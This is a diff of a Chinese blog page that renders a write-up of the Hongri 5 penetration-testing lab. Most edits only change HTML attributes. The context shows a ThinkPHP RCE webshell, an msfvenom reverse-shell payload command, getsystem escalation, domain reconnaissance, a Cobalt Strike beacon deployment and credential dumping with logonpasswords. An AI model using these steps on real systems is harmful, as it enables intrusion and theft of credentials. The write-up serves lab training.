-<p><strong>出自：</strong><a href="https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/"><strong>https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/</strong></a></p>
+<p><strong>出自：</strong><a href="https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/" target="_blank" rel="noopener noreferrer"><strong>https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/</strong></a></p>
 <blockquote>
 <p><!-- raw HTML omitted -->这里我思考了一个问题，thinkphp的版本这么多，如果kali里面的漏洞库没有，而在搜索引擎上去搜索又太耗费时间，有没有一个批量检测thinkphp漏洞的脚本呢？<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->这里我找到了一个thinkphp漏洞批量检测的脚本<!-- raw HTML omitted --></p>
 </blockquote>
-<div class="code-block-container" id="code-1779933344402673500" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344402673500">
+<div class="code-block-container" id="code-1779947699575167400" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699575167400">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -789,12 +785,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344402673500" title="Toggle" aria-expanded="false" aria-controls="code-1779933344402673500" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699575167400" title="Toggle" aria-expanded="false" aria-controls="code-1779947699575167400" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344402673500-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699575167400-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -965,7 +961,7 @@ win7  外网 IP： 192.168.135.150
 </div><blockquote>
 <p><!-- raw HTML omitted -->这里的使用方法很简单：将要检测的目标放在url.txt里面，如果存在漏洞的地址将自动生成一个target.txt文本保存<!-- raw HTML omitted --></p>
 </blockquote>
-<p><img decoding="async" height="1120" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459517.png" style="max-width: 100%; height: auto; aspect-ratio: 1886 / 1120;" width="1886"></p>
+<p><img decoding="async" height="1120" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459517.png" style="max-width: 100%; height: auto; aspect-ratio: 1886 / 1120;" width="1886"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
@@ -974,22 +970,22 @@ win7  外网 IP： 192.168.135.150
 <p>通过之前的 thinkphp 5.0 的 RCE 漏洞，上传了 shell.php，并且蚁剑连接成功，接下来对内网的信息进行收集：</p>
 <p>首先看到当前的用户权限是 Administrator</p>
 <p>并且暴露了内网 IP：192.168.138.136</p>
-<p><img decoding="async" height="993" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457763.png" style="max-width: 100%; height: auto; aspect-ratio: 1538 / 993;" width="1538"></p>
+<p><img decoding="async" height="993" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457763.png" style="max-width: 100%; height: auto; aspect-ratio: 1538 / 993;" width="1538"></p>
 <p><!-- raw HTML omitted -->查看一下域信息：”<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<p><img decoding="async" height="829" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459860.png" style="max-width: 100%; height: auto; aspect-ratio: 982 / 829;" width="982"></p>
+<p><img decoding="async" height="829" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459860.png" style="max-width: 100%; height: auto; aspect-ratio: 982 / 829;" width="982"></p>
 <h3 id="内网渗透">内网渗透<a hidden class="anchor" aria-hidden="true" href="#内网渗透">#</a></h3>
 <h4 id="上线-msf">上线 msf：<a hidden class="anchor" aria-hidden="true" href="#上线-msf">#</a></h4>
 <p>kali 生成一个后门：</p>
 <p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.135.128 LPORT=4444 -f exe &gt; abc.exe</code></p>
-<p><img decoding="async" height="890" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459846.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 890;" width="1897"></p>
+<p><img decoding="async" height="890" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459846.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 890;" width="1897"></p>
 <p>将 abc.exe 通过蚁剑上传</p>
-<p><img decoding="async" height="993" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500365.png" style="max-width: 100%; height: auto; aspect-ratio: 1538 / 993;" width="1538"></p>
+<p><img decoding="async" height="993" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500365.png" style="max-width: 100%; height: auto; aspect-ratio: 1538 / 993;" width="1538"></p>
 <p>执行 abc.exe</p>
-<p><img decoding="async" height="890" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457809.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 890;" width="1897"></p>
+<p><img decoding="async" height="890" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457809.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 890;" width="1897"></p>
 <p><!-- raw HTML omitted -->msf 开启监听<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->上线成功：<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344411444700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344411444700">
+<div class="code-block-container" id="code-1779947699583128700" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699583128700">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1001,12 +997,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344411444700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344411444700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699583128700" title="Toggle" aria-expanded="false" aria-controls="code-1779947699583128700" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344411444700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699583128700-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1046,7 +1042,7 @@ win7  外网 IP： 192.168.135.150
 </div></div>
 </div><h4 id="内网信息收集">内网信息收集<a hidden class="anchor" aria-hidden="true" href="#内网信息收集">#</a></h4>
 <p>尝试 getsystem 提权：</p>
-<div class="code-block-container" id="code-1779933344413027300" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344413027300">
+<div class="code-block-container" id="code-1779947699585611800" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699585611800">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1058,12 +1054,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344413027300" title="Toggle" aria-expanded="false" aria-controls="code-1779933344413027300" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699585611800" title="Toggle" aria-expanded="false" aria-controls="code-1779947699585611800" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344413027300-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699585611800-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -1080,7 +1076,7 @@ win7  外网 IP： 192.168.135.150
 </div>
 </div></div>
 </div><p><!-- raw HTML omitted -->对域进行信息搜集<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344413573400" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344413573400">
+<div class="code-block-container" id="code-1779947699587214900" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699587214900">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1092,12 +1088,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344413573400" title="Toggle" aria-expanded="false" aria-controls="code-1779933344413573400" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699587214900" title="Toggle" aria-expanded="false" aria-controls="code-1779947699587214900" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344413573400-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699587214900-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1236,7 +1232,7 @@ win7  外网 IP： 192.168.135.150
 </div>
 </div></div>
 </div><p><!-- raw HTML omitted -->只有一个域控，这里直接ping一下域控得到域控 ip 为 192.168.138.138<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344421447300" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344421447300">
+<div class="code-block-container" id="code-1779947699592339500" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699592339500">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1248,12 +1244,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344421447300" title="Toggle" aria-expanded="false" aria-controls="code-1779933344421447300" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699592339500" title="Toggle" aria-expanded="false" aria-controls="code-1779947699592339500" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344421447300-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699592339500-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1290,7 +1286,7 @@ win7  外网 IP： 192.168.135.150
 </div>
 </div></div>
 </div><h4 id="获取凭证"><!-- raw HTML omitted -->获取凭证<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#获取凭证">#</a></h4>
-<div class="code-block-container" id="code-1779933344422978800" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344422978800">
+<div class="code-block-container" id="code-1779947699593829300" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699593829300">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1302,12 +1298,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344422978800" title="Toggle" aria-expanded="false" aria-controls="code-1779933344422978800" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699593829300" title="Toggle" aria-expanded="false" aria-controls="code-1779947699593829300" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344422978800-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699593829300-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1389,7 +1385,7 @@ win7  外网 IP： 192.168.135.150
 </div></div>
 </div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344426040500" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344426040500">
+<div class="code-block-container" id="code-1779947699600649100" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699600649100">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1401,12 +1397,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344426040500" title="Toggle" aria-expanded="false" aria-controls="code-1779933344426040500" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699600649100" title="Toggle" aria-expanded="false" aria-controls="code-1779947699600649100" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344426040500-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699600649100-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -1425,7 +1421,7 @@ win7  外网 IP： 192.168.135.150
 </div>
 </div></div>
 </div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344426550600" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344426550600">
+<div class="code-block-container" id="code-1779947699601642500" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699601642500">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1437,12 +1433,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344426550600" title="Toggle" aria-expanded="false" aria-controls="code-1779933344426550600" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699601642500" title="Toggle" aria-expanded="false" aria-controls="code-1779947699601642500" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344426550600-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699601642500-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">  1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">  2</span>
@@ -1964,9 +1960,9 @@ win7  外网 IP： 192.168.135.150
 </div></div>
 </div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<p><img decoding="async" height="1232" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456562.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 1232;" width="1897"></p>
+<p><img decoding="async" height="1232" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456562.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 1232;" width="1897"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<p><img decoding="async" height="1232" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457843.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 1232;" width="1897"></p>
+<p><img decoding="async" height="1232" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457843.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 1232;" width="1897"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <ul>
 <li><strong>域管理员 (Administrator)</strong><!-- raw HTML omitted -->：<!-- raw HTML omitted -->
@@ -1992,47 +1988,47 @@ win7  外网 IP： 192.168.135.150
 <blockquote>
 <h1 id="cs-部署方式-1">CS 部署方式<a hidden class="anchor" aria-hidden="true" href="#cs-部署方式-1">#</a></h1>
 </blockquote>
-<p><img decoding="async" height="987" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081501131.png" style="max-width: 100%; height: auto; aspect-ratio: 1635 / 987;" width="1635"></p>
+<p><img decoding="async" height="987" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081501131.png" style="max-width: 100%; height: auto; aspect-ratio: 1635 / 987;" width="1635"></p>
 <blockquote>
 <h2 id="服务端kali">服务端（kali）<a hidden class="anchor" aria-hidden="true" href="#服务端kali">#</a></h2>
 <p>将天狐工具箱中的 CS 上传到 kali:</p>
 <p>赋予执行权限：</p>
 <p><code>sudo chmod -R +x ~/workspace/cs4.7/Cobalt_Strike_4.7</code></p>
 </blockquote>
-<p><img decoding="async" height="890" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500375.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 890;" width="1897"></p>
+<p><img decoding="async" height="890" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500375.png" style="max-width: 100%; height: auto; aspect-ratio: 1897 / 890;" width="1897"></p>
 <blockquote>
 <h3 id="kali-端启动-teamserver">Kali 端启动 TeamServer<a hidden class="anchor" aria-hidden="true" href="#kali-端启动-teamserver">#</a></h3>
 <p>TeamServer 是所有攻击的中转站。</p>
 <p><code>sudo ./teamserver &lt;kali-IP&gt; &lt;连接密码&gt;</code></p>
 </blockquote>
-<p><img decoding="async" height="1245" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500106.png" style="max-width: 100%; height: auto; aspect-ratio: 2534 / 1245;" width="2534"></p>
+<p><img decoding="async" height="1245" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500106.png" style="max-width: 100%; height: auto; aspect-ratio: 2534 / 1245;" width="2534"></p>
 <blockquote>
 <h2 id="windows-客户端连接">Windows 客户端连接<a hidden class="anchor" aria-hidden="true" href="#windows-客户端连接">#</a></h2>
 </blockquote>
-<p><img decoding="async" height="1245" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457231.png" style="max-width: 100%; height: auto; aspect-ratio: 2534 / 1245;" width="2534"></p>
+<p><img decoding="async" height="1245" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457231.png" style="max-width: 100%; height: auto; aspect-ratio: 2534 / 1245;" width="2534"></p>
 <blockquote>
 </blockquote>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457827.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457827.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <blockquote>
 <h2 id="创建监听器">创建监听器<a hidden class="anchor" aria-hidden="true" href="#创建监听器">#</a></h2>
 </blockquote>
-<p><img decoding="async" height="841" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459189.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 841;" width="1176"></p>
+<p><img decoding="async" height="841" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459189.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 841;" width="1176"></p>
 <blockquote>
 </blockquote>
-<p><img decoding="async" height="925" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459244.png" style="max-width: 100%; height: auto; aspect-ratio: 2151 / 925;" width="2151"></p>
+<p><img decoding="async" height="925" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459244.png" style="max-width: 100%; height: auto; aspect-ratio: 2151 / 925;" width="2151"></p>
 <blockquote>
 <h2 id="生成木马">生成木马<a hidden class="anchor" aria-hidden="true" href="#生成木马">#</a></h2>
 </blockquote>
-<p><img decoding="async" height="885" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500271.png" style="max-width: 100%; height: auto; aspect-ratio: 2117 / 885;" width="2117"></p>
+<p><img decoding="async" height="885" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500271.png" style="max-width: 100%; height: auto; aspect-ratio: 2117 / 885;" width="2117"></p>
 <blockquote>
 </blockquote>
-<p><img decoding="async" height="388" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500223.png" style="max-width: 100%; height: auto; aspect-ratio: 549 / 388;" width="549">之后选择保存文件地址</p>
+<p><img decoding="async" height="388" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500223.png" style="max-width: 100%; height: auto; aspect-ratio: 549 / 388;" width="549">之后选择保存文件地址</p>
 <blockquote>
 </blockquote>
 <p>可以直接利用蚁剑把文件上传</p>
-<p><img decoding="async" height="1040" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457201.png" style="max-width: 100%; height: auto; aspect-ratio: 1541 / 1040;" width="1541"></p>
+<p><img decoding="async" height="1040" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457201.png" style="max-width: 100%; height: auto; aspect-ratio: 1541 / 1040;" width="1541"></p>
 <p>通过蚁剑执行 beacon.exe 成功上线 CS：</p>
-<p><img decoding="async" height="944" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459150.png" style="max-width: 100%; height: auto; aspect-ratio: 1977 / 944;" width="1977"></p>
+<p><img decoding="async" height="944" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459150.png" style="max-width: 100%; height: auto; aspect-ratio: 1977 / 944;" width="1977"></p>
 <h3 id="cs-常用命令">CS 常用命令：<a hidden class="anchor" aria-hidden="true" href="#cs-常用命令">#</a></h3>
 <blockquote>
 <h1 id="cs-常用命令-1">CS 常用命令：<a hidden class="anchor" aria-hidden="true" href="#cs-常用命令-1">#</a></h1>
@@ -2048,13 +2044,13 @@ win7  外网 IP： 192.168.135.150
 <p><strong>扫描网段和端口</strong>：<code>portscan [目标IP/网段] [端口列表] [扫描类型] [并发数]</code></p>
 </blockquote>
 <h4 id="抓取明文密码logonpasswords">抓取明文密码：<code>logonpasswords</code><a hidden class="anchor" aria-hidden="true" href="#抓取明文密码logonpasswords">#</a></h4>
-<p><img decoding="async" height="1493" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459561.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1493;" width="2560"></p>
+<p><img decoding="async" height="1493" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459561.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1493;" width="2560"></p>
 <p>也可以用 **视图-&gt;密码凭证 **，所有被抓到的账号和密码都在这里</p>
-<p><img decoding="async" height="841" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458458.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 841;" width="1176"></p>
+<p><img decoding="async" height="841" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458458.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 841;" width="1176"></p>
 <h3 id="内网信息收集-1">内网信息收集<a hidden class="anchor" aria-hidden="true" href="#内网信息收集-1">#</a></h3>
